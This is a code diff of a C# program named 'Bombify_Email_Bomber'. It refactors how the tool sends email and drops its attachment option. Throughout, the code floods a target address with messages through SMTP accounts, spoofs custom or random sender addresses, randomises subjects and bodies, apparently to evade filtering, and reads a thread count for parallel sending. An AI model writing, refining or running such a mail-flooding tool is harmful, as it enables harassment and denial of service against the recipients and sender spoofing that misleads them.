@@ -81,7 +81,6 @@ namespace Bombify_Email_Bomber
 
             // Get user input
             UserInput.GetToInput();
-            UserInput.GetAttachmentInput();
             UserInput.GetSslInput();
             UserInput.GetThreadCount();
 
@@ -97,19 +96,6 @@ namespace Bombify_Email_Bomber
             }
 
             file.Close();
-
-            // Add to
-            Variables.Mail.To.Add(Variables.To);
-
-            // Check if user want an attachment
-            if (Variables.AttachmentPath == "None")
-            {
-
-            } else
-            {
-                // Add attachment
-                Variables.Mail.Attachments.Add(new Attachment(Variables.AttachmentPath));
-            }
 
             // Display text
             Console.Clear();
@@ -191,70 +177,79 @@ namespace Bombify_Email_Bomber
         // SendMail method
         public static void SendEmail(string Domain, int Port, string Username, string Password)
         {
-            // Check if user wants a customer sender
-            if (Variables.Sender == "None")
+            // Create new instance
+            using (MailMessage Mail = new MailMessage())
             {
-                // Add default sender
-                Variables.Mail.From = new MailAddress(SmtpCreds(2));
-            } else if (Variables.Sender == "rand")
-            {
-                // Add random sender
-                Variables.Mail.From = new MailAddress(RandomString(true, 12) + "@" + RandomString(true, 6) + "." + RandomString(true, 3));
-            } else
-            {
-                // Add custom sender
-                Variables.Mail.From = new MailAddress(Variables.Sender);
-            }
+                // Add to
+                Mail.To.Add(Variables.To);
 
-            // Create new smtpclient instance
-            using (SmtpClient Smtp = new SmtpClient(Domain, Port))
-            {
-                Smtp.Timeout = 5000;
-
-                // Check if user wants ssl or not
-                if (Variables.Ssl == 1)
+                // Check if user wants a customer sender
+                if (Variables.Sender == "None")
                 {
-                    // Use ssl
-                    Smtp.EnableSsl = true;
+                    // Add default sender
+                    Mail.From = new MailAddress(SmtpCreds(2));
+                }
+                else if (Variables.Sender == "rand")
+                {
+                    // Add random sender
+                    Mail.From = new MailAddress(RandomString(true, 12) + "@" + RandomString(true, 6) + "." + RandomString(true, 3));
                 }
                 else
                 {
-                    // Dont use ssl
-                    Smtp.EnableSsl = false;
+                    // Add custom sender
+                    Mail.From = new MailAddress(Variables.Sender);
                 }
 
-                // Choose credentials
-                Smtp.Credentials = new NetworkCredential(Username, Password);
+                // Create new smtpclient instance
+                using (SmtpClient Smtp = new SmtpClient(Domain, Port))
+                {
+                    Smtp.Timeout = 5000;
 
-                // Check if mode's value is 1
-                if (Variables.Mode == 1)
-                {
-                    // Add title and body
-                    Variables.Mail.Subject = Variables.Title + " " + RandomString(false, 8);
-                    Variables.Mail.Body = Variables.Body;
-                }
-                else
-                {
-                    // Add random title and body
-                    Variables.Mail.Subject = RandomString(true, 64);
-                    Variables.Mail.Body = RandomString(true, 64);
-                }
+                    // Check if user wants ssl or not
+                    if (Variables.Ssl == 1)
+                    {
+                        // Use ssl
+                        Smtp.EnableSsl = true;
+                    }
+                    else
+                    {
+                        // Dont use ssl
+                        Smtp.EnableSsl = false;
+                    }
 
-                // Handle errors while sending email
-                try
-                {
-                    // Send email
-                    Smtp.Send(Variables.Mail);
+                    // Choose credentials
+                    Smtp.Credentials = new NetworkCredential(Username, Password);
 
-                    // Display text
-                    Console.ForegroundColor = ConsoleColor.Green;
-                    Console.WriteLine("Email sent (" + Domain + ", " + Username + ")");
-                }
-                catch
-                {
-                    // Show error message
-                    Console.ForegroundColor = ConsoleColor.Red;
-                    Console.WriteLine("Error sending email with "+ "(" + Domain + ", " + Username + ")");
+                    // Check if mode's value is 1
+                    if (Variables.Mode == 1)
+                    {
+                        // Add title and body
+                        Mail.Subject = Variables.Title + " " + RandomString(false, 8);
+                        Mail.Body = Variables.Body;
+                    }
+                    else
+                    {
+                        // Add random title and body
+                        Mail.Subject = RandomString(true, 64);
+                        Mail.Body = RandomString(true, 64);
+                    }
+
+                    // Handle errors while sending email
+                    try
+                    {
+                        // Send email
+                        Smtp.Send(Mail);
+
+                        // Display text
+                        Console.ForegroundColor = ConsoleColor.Green;
+                        Console.WriteLine("Email sent (" + Domain + ", " + Username + ")");
+                    }
+                    catch
+                    {
+                        // Show error message
+                        Console.ForegroundColor = ConsoleColor.Red;
+                        Console.WriteLine("Error sending email with " + "(" + Domain + ", " + Username + ")");
+                    }
                 }
             }
         }
